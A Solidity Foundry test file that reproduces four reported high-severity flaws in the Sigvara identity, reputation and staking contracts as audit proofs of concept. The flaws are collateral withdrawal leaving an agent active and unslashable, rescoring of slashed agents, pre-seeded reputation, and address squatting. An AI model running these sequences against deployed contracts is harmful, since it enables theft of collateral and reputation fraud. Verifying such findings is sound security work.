// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../src/SigvaraIdentity.sol";
import "../src/SigvaraReputation.sol";
import "../src/SigvaraStaking.sol";

contract CMock is ERC20 {
    constructor() ERC20("Sigvara", "SVR") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/// Independent verification probe. Asserts the CURRENT (vulnerable) behaviour so
/// each finding is reproducible. These assertions must be inverted once fixed.
contract VerifyCollateralEscapeTest is Test {
    CMock svr;
    SigvaraIdentity identity;
    SigvaraReputation rep;
    SigvaraStaking staking;

    address admin     = makeAddr("admin");
    address committee = makeAddr("committee");
    address oracle    = makeAddr("oracle");
    address operator  = makeAddr("operator");
    address agentAddr = makeAddr("agent");
    address victim    = makeAddr("victim");

    uint256 constant MIN_STAKE = 1000e18;
    uint256 constant CHALLENGE = 7 days;
    uint256 constant UNBONDING = 21 days;
    uint256 constant WINDOW    = 6 hours;

    bytes32 didHash;

    function setUp() public {
        svr = new CMock();
        identity = SigvaraIdentity(address(new ERC1967Proxy(
            address(new SigvaraIdentity()),
            abi.encodeCall(SigvaraIdentity.initialize, (admin, address(0)))
        )));
        rep = SigvaraReputation(address(new ERC1967Proxy(
            address(new SigvaraReputation()),
            abi.encodeCall(SigvaraReputation.initialize, (admin, oracle, address(0), committee, WINDOW))
        )));
        staking = SigvaraStaking(address(new ERC1967Proxy(
            address(new SigvaraStaking()),
            abi.encodeCall(SigvaraStaking.initialize, (
                admin, address(identity), address(rep), address(svr), MIN_STAKE, CHALLENGE, UNBONDING
            ))
        )));
        vm.startPrank(admin);
        identity.grantRole(identity.STAKING_CORE_ROLE(), address(staking));
        rep.grantRole(rep.STAKING_CORE_ROLE(), address(staking));
        staking.grantRole(staking.SLASHING_COMMITTEE_ROLE(), committee);
        vm.stopPrank();

        vm.prank(operator);
        didHash = identity.registerAgent(agentAddr, bytes32(uint256(1)));

        svr.mint(operator, MIN_STAKE);
        vm.startPrank(operator);
        svr.approve(address(staking), MIN_STAKE);
        staking.depositStake(didHash, MIN_STAKE);
        vm.stopPrank();
    }

    function _maxScore() internal pure returns (SigvaraReputation.ReputationData memory) {
        return SigvaraReputation.ReputationData({
            feeScore: 30, successScore: 25, ageScore: 20,
            externalScore: 15, communityScore: 5, propagationScore: 5,
            lastUpdated: 0
        });
    }

    /// Reported HIGH: the operator alone, with no committee involvement and no
    /// race, ends up Active with zero collateral and permanently unslashable.
    function test_VERIFY_activeWithZeroCollateralAndUnslashable() public {
        assertTrue(staking.hasMinimumStake(didHash));

        // 1. Self-suspend (permitted: no slash lock is set).
        vm.prank(operator);
        identity.updateStatus(didHash, SigvaraIdentity.AgentStatus.Suspended);

        // 2. Queue the entire stake; the minimumStake floor applies only while Active.
        vm.prank(operator);
        staking.initiateWithdrawal(didHash, MIN_STAKE);

        // 3. Wait out unbonding and take the tokens back.
        vm.warp(block.timestamp + UNBONDING + 1);
        vm.prank(operator);
        staking.claimWithdrawal(didHash);
        assertEq(svr.balanceOf(operator), MIN_STAKE, "operator recovered the full bond");

        // 4. Return to Active. Nothing checks collateral.
        vm.prank(operator);
        identity.updateStatus(didHash, SigvaraIdentity.AgentStatus.Active);

        assertTrue(identity.isActive(didHash), "agent reads as Active");
        assertEq(staking.getStake(didHash), 0, "with zero stake");
        assertFalse(staking.hasMinimumStake(didHash), "and below the minimum");

        // 5. The committee can no longer slash it at all.
        vm.prank(committee);
        vm.expectRevert(abi.encodeWithSelector(SigvaraStaking.NoStake.selector, didHash));
        staking.initiateSlash(didHash, victim, "");
    }

    /// Reported HIGH: a slashed agent can be given a perfect score again.
    function test_VERIFY_slashedAgentCanBeRescored() public {
        vm.prank(committee);
        staking.initiateSlash(didHash, victim, "");
        vm.warp(block.timestamp + CHALLENGE + 1);
        staking.executeSlash(didHash);

        assertEq(uint8(identity.getIdentity(didHash).status), uint8(SigvaraIdentity.AgentStatus.Slashed));
        assertEq(rep.getTotalScore(didHash), 0, "score zeroed by the slash");

        // Nothing in the reputation contract consults the identity registry.
        vm.prank(oracle);
        rep.proposeReputation(didHash, _maxScore());
        vm.warp(block.timestamp + WINDOW + 1);
        rep.finalizeReputation(didHash); // permissionless

        assertEq(rep.getTotalScore(didHash), 100, "slashed agent restored to a perfect score");
        assertTrue(rep.meetsThreshold(didHash, 100));
    }

    /// Reported HIGH: a score can be written for a DID nobody has registered, and
    /// is inherited by whoever registers that address later.
    function test_VERIFY_reputationPreSeededForUnregisteredDid() public {
        address futureAgent = makeAddr("futureAgent");
        bytes32 futureDid = identity.computeDidHash(futureAgent);
        assertEq(identity.getIdentity(futureDid).registeredAt, 0, "not registered yet");

        vm.prank(oracle);
        rep.proposeReputation(futureDid, _maxScore());
        vm.warp(block.timestamp + WINDOW + 1);
        rep.finalizeReputation(futureDid);
        assertEq(rep.getTotalScore(futureDid), 100);

        // Someone registers it afterwards and inherits a mature-looking score.
        address newcomer = makeAddr("newcomer");
        vm.prank(newcomer);
        bytes32 registered = identity.registerAgent(futureAgent, bytes32(uint256(7)));
        assertEq(registered, futureDid);
        assertEq(identity.getIdentity(futureDid).registeredAt, block.timestamp, "brand new identity");
        assertEq(rep.getTotalScore(futureDid), 100, "already at a perfect score on day zero");
    }

    /// Reported HIGH: registration proves no control over the agent address.
    function test_VERIFY_agentAddressCanBeSquatted() public {
        address victimAgent = makeAddr("victimAgent");
        address attacker    = makeAddr("attacker");
        bytes32 attackerKey = bytes32(uint256(0xbad));

        vm.prank(attacker);
        bytes32 squatted = identity.registerAgent(victimAgent, attackerKey);

        SigvaraIdentity.AgentIdentity memory id = identity.getIdentity(squatted);
        assertEq(id.operator, attacker, "attacker owns the DID for an address it does not control");
        assertEq(id.ed25519PubKey, attackerKey, "and chose the key verifiers will trust");

        // The rightful owner is locked out permanently.
        vm.prank(victimAgent);
        vm.expectRevert(abi.encodeWithSelector(SigvaraIdentity.AlreadyRegistered.selector, squatted));
        identity.registerAgent(victimAgent, bytes32(uint256(0x900d)));
    }
}
